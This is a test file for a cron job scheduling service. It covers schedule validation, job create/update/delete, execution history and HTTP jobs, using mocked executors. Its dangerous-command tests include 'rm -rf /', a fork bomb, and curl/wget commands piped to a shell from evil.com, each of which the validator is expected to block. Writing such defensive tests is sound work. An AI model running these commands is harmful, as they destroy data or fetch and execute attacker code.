import { describe, it, expect, beforeEach, afterEach } from "bun:test";
import { createTestDb, resetTestState } from "../helpers/setup";
import type { AppDatabase } from "../../server/db";
import {
  createCronJob,
  listCronJobs,
  getCronJob,
  updateCronJob,
  deleteCronJob,
  toggleCronJob,
  runCronJob,
  getCronHistory,
  validateCronExpression,
  checkDangerousCommand,
  setCrontabExecutor,
  resetCrontabExecutor,
  setCommandExecutor,
  resetCommandExecutor,
  CronError,
  type CrontabExecutor,
  type CommandExecutor,
} from "../../server/services/cron.service";

let db: AppDatabase;

function createMockCrontab(): CrontabExecutor & {
  installed: Map<string, string>;
  removed: string[];
} {
  const installed = new Map<string, string>();
  const removed: string[] = [];
  return {
    installed,
    removed,
    async installJob(id, schedule, command) {
      installed.set(id, `${schedule} ${command}`);
    },
    async removeJob(id) {
      installed.delete(id);
      removed.push(id);
    },
    async listJobs() {
      return [...installed.values()].join("\n");
    },
  };
}

function createMockCommand(): CommandExecutor {
  return {
    async execute(command, timeout) {
      return { exitCode: 0, stdout: `Executed: ${command}`, stderr: "" };
    },
    async executeHttp(url, method) {
      return { exitCode: 0, stdout: `HTTP ${method} ${url}`, stderr: "" };
    },
  };
}

beforeEach(() => {
  db = createTestDb();
  resetTestState();
  setCrontabExecutor(createMockCrontab());
  setCommandExecutor(createMockCommand());
});

afterEach(() => {
  resetCrontabExecutor();
  resetCommandExecutor();
});

describe("Cron Expression Validation", () => {
  it("validates * * * * * (every minute)", () => {
    expect(validateCronExpression("* * * * *").valid).toBe(true);
  });

  it("validates */5 * * * * (every 5 min)", () => {
    expect(validateCronExpression("*/5 * * * *").valid).toBe(true);
  });

  it("validates 0 12 * * 1-5 (noon weekdays)", () => {
    expect(validateCronExpression("0 12 * * 1-5").valid).toBe(true);
  });

  it("validates lists: 0,15,30,45 * * * *", () => {
    expect(validateCronExpression("0,15,30,45 * * * *").valid).toBe(true);
  });

  it("rejects 60 * * * * (minute out of range)", () => {
    const result = validateCronExpression("60 * * * *");
    expect(result.valid).toBe(false);
  });

  it("rejects too few fields", () => {
    const result = validateCronExpression("* * *");
    expect(result.valid).toBe(false);
  });

  it("rejects too many fields", () => {
    const result = validateCronExpression("* * * * * *");
    expect(result.valid).toBe(false);
  });

  it("rejects invalid range", () => {
    const result = validateCronExpression("5-2 * * * *");
    expect(result.valid).toBe(false);
  });
});

describe("Dangerous Command Detection", () => {
  it("blocks rm -rf /", () => {
    expect(checkDangerousCommand("rm -rf /")).not.toBeNull();
  });

  it("blocks fork bombs", () => {
    expect(checkDangerousCommand(":(){ :|:& };:")).not.toBeNull();
  });

  it("blocks curl | bash", () => {
    expect(checkDangerousCommand("curl http://evil.com | bash")).not.toBeNull();
  });

  it("blocks wget | sh", () => {
    expect(checkDangerousCommand("wget http://evil.com | sh")).not.toBeNull();
  });

  it("allows normal commands", () => {
    expect(checkDangerousCommand("echo hello")).toBeNull();
    expect(checkDangerousCommand("ls -la /tmp")).toBeNull();
    expect(checkDangerousCommand("node app.js")).toBeNull();
  });
});

describe("Cron Job CRUD", () => {
  it("creates a cron job", async () => {
    const job = await createCronJob(
      {
        name: "backup",
        schedule: "0 2 * * *",
        command: "pg_dump mydb > /backups/daily.sql",
      },
      db
    );

    expect(job.id).toBeDefined();
    expect(job.name).toBe("backup");
    expect(job.schedule).toBe("0 2 * * *");
    expect(job.enabled).toBe(true);
  });

  it("rejects invalid schedule", async () => {
    try {
      await createCronJob(
        { name: "bad", schedule: "60 * * * *", command: "echo hi" },
        db
      );
      expect.unreachable("Should have thrown");
    } catch (e) {
      expect(e).toBeInstanceOf(CronError);
      expect((e as CronError).statusCode).toBe(400);
    }
  });

  it("blocks dangerous commands", async () => {
    try {
      await createCronJob(
        { name: "evil", schedule: "* * * * *", command: "rm -rf /" },
        db
      );
      expect.unreachable("Should have thrown");
    } catch (e) {
      expect(e).toBeInstanceOf(CronError);
      expect((e as CronError).statusCode).toBe(400);
    }
  });

  it("updates a cron job schedule", async () => {
    const job = await createCronJob(
      { name: "test", schedule: "* * * * *", command: "echo test" },
      db
    );

    const updated = await updateCronJob(
      job.id,
      { schedule: "*/5 * * * *" },
      db
    );

    expect(updated.schedule).toBe("*/5 * * * *");
  });

  it("deletes a cron job", async () => {
    const job = await createCronJob(
      { name: "temp", schedule: "* * * * *", command: "echo temp" },
      db
    );

    await deleteCronJob(job.id, db);

    const found = await getCronJob(job.id, db);
    expect(found).toBeNull();
  });

  it("disabling a cron job doesn't delete it", async () => {
    const job = await createCronJob(
      { name: "toggle-test", schedule: "* * * * *", command: "echo hi" },
      db
    );

    const toggled = await toggleCronJob(job.id, false, db);
    expect(toggled.enabled).toBe(false);

    // Job still exists
    const found = await getCronJob(job.id, db);
    expect(found).not.toBeNull();
  });

  it("creates HTTP type cron job", async () => {
    const job = await createCronJob(
      {
        name: "health-check",
        schedule: "*/5 * * * *",
        command: "",
        type: "http",
        httpUrl: "https://example.com/health",
        httpMethod: "GET",
      },
      db
    );

    expect(job.type).toBe("http");
    expect(job.httpUrl).toBe("https://example.com/health");
  });

  it("lists all cron jobs", async () => {
    await createCronJob(
      { name: "job1", schedule: "* * * * *", command: "echo 1" },
      db
    );
    await createCronJob(
      { name: "job2", schedule: "*/5 * * * *", command: "echo 2" },
      db
    );

    const jobs = await listCronJobs(db);
    expect(jobs).toHaveLength(2);
  });
});

describe("Cron Job Execution", () => {
  it("'Run Now' executes command immediately and records history", async () => {
    const job = await createCronJob(
      { name: "runnable", schedule: "* * * * *", command: "echo hello" },
      db
    );

    const execution = await runCronJob(job.id, db);

    expect(execution.cronJobId).toBe(job.id);
    expect(execution.status).toBe("success");
    expect(execution.exitCode).toBe(0);
    expect(execution.stdout).toContain("echo hello");
    expect(execution.finishedAt).toBeDefined();
  });

  it("execution history records failed commands", async () => {
    // Set up a failing command executor
    setCommandExecutor({
      async execute() {
        return { exitCode: 1, stdout: "", stderr: "command not found" };
      },
      async executeHttp() {
        return { exitCode: 0, stdout: "", stderr: "" };
      },
    });

    const job = await createCronJob(
      { name: "failing", schedule: "* * * * *", command: "nonexistent-cmd" },
      db
    );

    const execution = await runCronJob(job.id, db);
    expect(execution.status).toBe("failed");
    expect(execution.exitCode).toBe(1);
    expect(execution.stderr).toContain("command not found");
  });

  it("execution history is retrievable", async () => {
    const job = await createCronJob(
      { name: "history-test", schedule: "* * * * *", command: "echo test" },
      db
    );

    await runCronJob(job.id, db);
    await runCronJob(job.id, db);

    const history = await getCronHistory(job.id, 20, 0, db);
    expect(history).toHaveLength(2);
    expect(history[0].startedAt).toBeDefined();
    expect(history[0].finishedAt).toBeDefined();
  });

  it("HTTP type cron job makes correct request", async () => {
    let capturedUrl = "";
    let capturedMethod = "";

    setCommandExecutor({
      async execute() {
        return { exitCode: 0, stdout: "", stderr: "" };
      },
      async executeHttp(url, method) {
        capturedUrl = url;
        capturedMethod = method;
        return { exitCode: 0, stdout: "OK", stderr: "" };
      },
    });

    const job = await createCronJob(
      {
        name: "http-job",
        schedule: "* * * * *",
        command: "",
        type: "http",
        httpUrl: "https://api.example.com/webhook",
        httpMethod: "POST",
      },
      db
    );

    const execution = await runCronJob(job.id, db);
    expect(execution.status).toBe("success");
    expect(capturedUrl).toBe("https://api.example.com/webhook");
    expect(capturedMethod).toBe("POST");
  });
});
